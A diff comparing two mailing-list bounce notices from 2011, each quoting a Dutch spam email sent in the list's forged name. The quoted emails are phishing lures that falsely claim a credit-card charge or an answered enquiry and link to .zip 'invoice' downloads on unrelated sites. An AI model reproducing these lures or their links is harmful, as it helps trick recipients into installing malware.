@@ -1,10 +1,9 @@
-From: Mail Delivery Subsystem <MAILER-DAEMON-suQt9vcvTAnwgZjV3Hyh5IQuADTiUCJX@public.gmane.org>
-Subject: Returned Mail:
- Order N1927887158
-Date: Thu, 1 Dec 2011 02:50:24 +0100 (MET)
-Message-ID: <V06387nAUKZbeE@mo-p05-ob.rzone.de>
+From: MAILER-DAEMON-EZFSkhG576Cv97p5JZYw6gtmqKfFKWOT@public.gmane.org (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+Date: Thu,  1 Dec 2011 03:29:12 +0100 (CET)
+Message-ID: <20111201022912.C5CEE995531@aytoalhaurindelatorre>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============1284068802197376408=="
+Content-Type: multipart/mixed; boundary="===============4475502626755250818=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -18,162 +17,106 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-encapsulated message
+This is a MIME-encapsulated message.
 
---===============1284068802197376408==
+--===============4475502626755250818==
 Content-Type: multipart/report; report-type=delivery-status;
- boundary="V06387nAUKZbeE/mo-p05-ob.rzone.de"
+	boundary="3B149995518.1322706552/aytoalhaurindelatorre"
+Content-Transfer-Encoding: 7bit
 
-This is a MIME-encapsulated message
+This is a MIME-encapsulated message.
 
---V06387nAUKZbeE/mo-p05-ob.rzone.de
-Content-Type: text/plain; charset=UTF-8
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
+--3B149995518.1322706552/aytoalhaurindelatorre
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
 
-*** MAIL DELIVERY FAILURE REPORT ***
+This is the mail system at host aytoalhaurindelatorre.
 
-The original message was received at Thu, 01 Dec 2011 05:02:23 +0400
-from host [10.0.1.220].
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
 
-Subject: Order N1927887158
-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+For further assistance, please send mail to postmaster.
 
-Mail delivery to the following recipients has finally failed:
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
 
-ask-teza-0mIQJv397HQ@public.gmane.org
-   Last reason: 550 5.0.0 Mailbox unavailable/command rejected for policy=
- reasons/no=20
-                access
-   Explanation: host mail.pivos.nl [93.157.3.84] said: sorry, no mailbox =
-here by that=20
-                name. (#5.7.17)
-   Final attempt was: Thu, 1 Dec 2011 02:49:28 +0100 (MET)
+                   The mail system
 
-   Transcript of session:
-   ... while talking to mail.pivos.nl [93.157.3.84]:
-   >>> RCPT TO:<ask-teza-0mIQJv397HQ@public.gmane.org>
-   <<< 550 sorry, no mailbox here by that name. (#5.7.17)
+<schrijfnaarons-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org>: host mailin.planet.nl[213.75.3.30] said: 550 5.0.0
+    Mail rejected. (in reply to end of DATA command)
 
-ason-kottam-0mIQJv397HQ@public.gmane.org
-   Last reason: 550 5.0.0 Mailbox unavailable/command rejected for policy=
- reasons/no=20
-                access
-   Explanation: host mail.pivos.nl [93.157.3.84] said: sorry, no mailbox =
-here by that=20
-                name. (#5.7.17)
-   Final attempt was: Thu, 1 Dec 2011 02:49:31 +0100 (MET)
+<schrijfschap-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org>: host mailin.planet.nl[213.75.3.30] said: 550 5.0.0
+    Mail rejected. (in reply to end of DATA command)
 
-   Transcript of session:
-   ... while talking to mail.pivos.nl [93.157.3.84]:
-   >>> RCPT TO:<ason-kottam-0mIQJv397HQ@public.gmane.org>
-   <<< 550 sorry, no mailbox here by that name. (#5.7.17)
+<schrijn-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org>: host mailin.planet.nl[213.75.3.30] said: 550 5.0.0 Mail
+    rejected. (in reply to end of DATA command)
 
-assaad.lempert-0mIQJv397HQ@public.gmane.org
-   Last reason: 550 5.0.0 Mailbox unavailable/command rejected for policy=
- reasons/no=20
-                access
-   Explanation: host mail.pivos.nl [93.157.3.84] said: sorry, no mailbox =
-here by that=20
-                name. (#5.7.17)
-   Final attempt was: Thu, 1 Dec 2011 02:49:34 +0100 (MET)
+<schrijnders-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org>: host mailin.planet.nl[213.75.3.30] said: 550 5.0.0
+    Mail rejected. (in reply to end of DATA command)
 
-   Transcript of session:
-   ... while talking to mail.pivos.nl [93.157.3.84]:
-   >>> RCPT TO:<assaad.lempert-0mIQJv397HQ@public.gmane.org>
-   <<< 550 sorry, no mailbox here by that name. (#5.7.17)
+<schrijnemaekers-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org>: host mailin.planet.nl[213.75.3.30] said: 550 5.0.0
+    Mail rejected. (in reply to end of DATA command)
 
-assaad_ryyppo-0mIQJv397HQ@public.gmane.org
-   Last reason: 550 5.0.0 Mailbox unavailable/command rejected for policy=
- reasons/no=20
-                access
-   Explanation: host mail.pivos.nl [93.157.3.84] said: sorry, no mailbox =
-here by that=20
-                name. (#5.7.17)
-   Final attempt was: Thu, 1 Dec 2011 02:49:37 +0100 (MET)
-
-   Transcript of session:
-   ... while talking to mail.pivos.nl [93.157.3.84]:
-   >>> RCPT TO:<assaad_ryyppo-0mIQJv397HQ@public.gmane.org>
-   <<< 550 sorry, no mailbox here by that name. (#5.7.17)
-
-assad.magnusson-0mIQJv397HQ@public.gmane.org
-   Last reason: 550 5.0.0 Mailbox unavailable/command rejected for policy=
- reasons/no=20
-                access
-   Explanation: host mail.pivos.nl [93.157.3.84] said: sorry, no mailbox =
-here by that=20
-                name. (#5.7.17)
-   Final attempt was: Thu, 1 Dec 2011 02:49:40 +0100 (MET)
-
-   Transcript of session:
-   ... while talking to mail.pivos.nl [93.157.3.84]:
-   >>> RCPT TO:<assad.magnusson-0mIQJv397HQ@public.gmane.org>
-   <<< 550 sorry, no mailbox here by that name. (#5.7.17)
-
---V06387nAUKZbeE/mo-p05-ob.rzone.de
+--3B149995518.1322706552/aytoalhaurindelatorre
+Content-Description: Delivery report
 Content-Type: message/delivery-status
-Content-Disposition: attachment
 
-Reporting-MTA: DNS; mo-p05-ob.rzone.de
-Received-From-MTA: DNS; 10.0.1.220 (213.42.30.102)
-Arrival-Date: Thu, 1 Dec 2011 02:49:11 +0100 (MET)
+Reporting-MTA: dns; aytoalhaurindelatorre
+X-Postfix-Queue-ID: 3B149995518
+X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Thu,  1 Dec 2011 03:29:10 +0100 (CET)
 
-Final-Recipient: RFC822; ask-teza-0mIQJv397HQ@public.gmane.org
+Final-Recipient: rfc822; schrijfnaarons-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
+Original-Recipient: rfc822;schrijfnaarons-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
 Action: failed
 Status: 5.0.0
-Remote-MTA: DNS; mail.pivos.nl [93.157.3.84]
-Diagnostic-Code: SMTP; 550 sorry, no mailbox here by that name. (#5.7.17)
-Last-Attempt-Date: Thu, 1 Dec 2011 02:49:28 +0100 (MET)
-Final-Log-ID: V06387nAUKZbe7
+Remote-MTA: dns; mailin.planet.nl
+Diagnostic-Code: smtp; 550 5.0.0 Mail rejected.
 
-Final-Recipient: RFC822; ason-kottam-0mIQJv397HQ@public.gmane.org
+Final-Recipient: rfc822; schrijfschap-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
+Original-Recipient: rfc822;schrijfschap-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
 Action: failed
 Status: 5.0.0
-Remote-MTA: DNS; mail.pivos.nl [93.157.3.84]
-Diagnostic-Code: SMTP; 550 sorry, no mailbox here by that name. (#5.7.17)
-Last-Attempt-Date: Thu, 1 Dec 2011 02:49:31 +0100 (MET)
-Final-Log-ID: V06387nAUKZbe7
+Remote-MTA: dns; mailin.planet.nl
+Diagnostic-Code: smtp; 550 5.0.0 Mail rejected.
 
-Final-Recipient: RFC822; assaad.lempert-0mIQJv397HQ@public.gmane.org
+Final-Recipient: rfc822; schrijn-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
+Original-Recipient: rfc822;schrijn-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
 Action: failed
 Status: 5.0.0
-Remote-MTA: DNS; mail.pivos.nl [93.157.3.84]
-Diagnostic-Code: SMTP; 550 sorry, no mailbox here by that name. (#5.7.17)
-Last-Attempt-Date: Thu, 1 Dec 2011 02:49:34 +0100 (MET)
-Final-Log-ID: V06387nAUKZbe7
+Remote-MTA: dns; mailin.planet.nl
+Diagnostic-Code: smtp; 550 5.0.0 Mail rejected.
 
-Final-Recipient: RFC822; assaad_ryyppo-0mIQJv397HQ@public.gmane.org
+Final-Recipient: rfc822; schrijnders-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
+Original-Recipient: rfc822;schrijnders-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
 Action: failed
 Status: 5.0.0
-Remote-MTA: DNS; mail.pivos.nl [93.157.3.84]
-Diagnostic-Code: SMTP; 550 sorry, no mailbox here by that name. (#5.7.17)
-Last-Attempt-Date: Thu, 1 Dec 2011 02:49:37 +0100 (MET)
-Final-Log-ID: V06387nAUKZbe7
+Remote-MTA: dns; mailin.planet.nl
+Diagnostic-Code: smtp; 550 5.0.0 Mail rejected.
 
-Final-Recipient: RFC822; assad.magnusson-0mIQJv397HQ@public.gmane.org
+Final-Recipient: rfc822; schrijnemaekers-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
+Original-Recipient: rfc822;schrijnemaekers-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
 Action: failed
 Status: 5.0.0
-Remote-MTA: DNS; mail.pivos.nl [93.157.3.84]
-Diagnostic-Code: SMTP; 550 sorry, no mailbox here by that name. (#5.7.17)
-Last-Attempt-Date: Thu, 1 Dec 2011 02:49:40 +0100 (MET)
-Final-Log-ID: V06387nAUKZbe7
+Remote-MTA: dns; mailin.planet.nl
+Diagnostic-Code: smtp; 550 5.0.0 Mail rejected.
 
---V06387nAUKZbeE/mo-p05-ob.rzone.de
+--3B149995518.1322706552/aytoalhaurindelatorre
+Content-Description: Undelivered Message
 Content-Type: message/rfc822
-Content-Disposition: attachment
+Content-Transfer-Encoding: 7bit
 
-X-RZG-AUTH: :LXgBe0OhdPHKID2iLz2BLQthM4O+zhJ4iVqG2l/WnWrGgiIMuF1knzsQR8FodLHKDXuxRlc3BLPkEDUKjRkwnGk=
-X-RZG-CLASS-ID: mo05
-Received: from 10.0.1.220 (www.almawakeb.sch.ae [213.42.30.102])
-	by smtp.strato.de (fruni mo32) (RZmta 26.10 AUTH)
-	with ESMTPA id V06387nAUKZbe7 ; Thu, 1 Dec 2011 02:49:11 +0100 (MET)
-Received: from [10.0.1.220] by 10.0.1.220 id dm3vkUyDkWtg; Thu, 01 Dec 2011 05:02:23 +0400
-Message-ID: <00c701ccafc4$e063f600$14000a0a-60x1kTqCWHVgJAXftmDEsQ@public.gmane.org>
-From: "OrdersCo" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <ask-teza-0mIQJv397HQ@public.gmane.org>
-Subject: Order N1927887158
-Date: Thu, 01 Dec 2011 05:02:23 +0400
+Received: from 10.0.1.220 (demo.amsi.ae [213.42.30.102])
+	by aytoalhaurindelatorre (Postfix) with ESMTP id 3B149995518;
+	Thu,  1 Dec 2011 03:29:10 +0100 (CET)
+Received: from [10.0.1.220] by 10.0.1.220 id ECnctOfoTnnR with SMTP; Thu, 01 Dec 2011 05:42:22 +0400
+Date: Thu, 01 Dec 2011 05:42:22 +0400
+From: "Consult2 " <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.5.93.1) Educational
+X-Priority: 3 (Normal)
+Message-ID: <743294425.31059643328103-60x1kTqCWHVgJAXftmDEsQ@public.gmane.org>
+To: <schrijfnaarons-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org>
+Subject: Your request id: 372310.
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
@@ -181,26 +124,25 @@ Content-Transfer-Encoding: quoted-printable
 
 
 
+Tel./Fax.: +31 (0)346 279 04 36=20
 
-Hallo, ask-teza-0mIQJv397HQ@public.gmane.org
-
-
-Het antwoord op uw vraag over het profiel op onze website 22.11.2011.
-
-Dagelijks kunt u hier vinden:
-http://www.gruppoalpinisticovicentino.com/docdown/CommercialInfo.zip?idin=
-voice=3D942049532Firma=3Dask-teza-0mIQJv397HQ@public.gmane.org
+Geachte klant.
 
 
-We zullen blij zijn om samen te werken in de toekomst.
-Tel./Fax.: +31 (0)78 199 17 37
+Dank u voor de bestelling,
+uw creditcard in rekening gebracht voor 280 dollar.
+Informatie over de bestelling en levering details is in bijgevoegd bestan=
+d.
+http://lacasasostenibile.com/docdown/Factuur.zip?idinvoice=3D33065886109F=
+irma=3Dschrijfnaarons-EIBgga6/0yRmR6Xm/wNWPw@public.gmane.org
+
+Met vriendelijke groet, ticket service.
 
 
 
---V06387nAUKZbeE/mo-p05-ob.rzone.de--
+--3B149995518.1322706552/aytoalhaurindelatorre--
 
-
---===============1284068802197376408==
+--===============4475502626755250818==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -210,4 +152,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============1284068802197376408==--
+--===============4475502626755250818==--
